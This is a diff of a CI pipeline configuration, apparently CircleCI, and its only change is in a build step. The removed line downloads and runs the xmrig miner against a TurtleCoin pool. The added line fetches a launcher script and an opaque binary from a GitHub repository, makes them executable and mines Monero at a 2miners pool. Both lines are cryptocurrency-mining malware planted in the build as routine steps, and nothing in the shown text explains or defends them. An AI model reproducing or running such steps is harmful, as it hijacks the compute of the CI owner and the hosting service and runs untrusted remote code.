@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run  wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -zxf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o us.turtlecoin.herominers.com:1160 -u TRTLuz3CqRE9EGMBoT5EgB9u2ps35M8yNHTTAwpzz2n39uDpfrUc26g9Ztoig7YtsF9GAFDt3pQND96TVjb2RQ7HAQN3CCb3AgBjojmHXtQb6Y4bW3WdRLPn7az5qrzes3NH2ZsJo1KuHX9JL6D2Qgm8Kf5DqMRMhW8uhi6ozNiWB4YpH94SwRG2JFg -p OK -a argon2/chukwav2 -k
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <WALLET ADDRESS>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
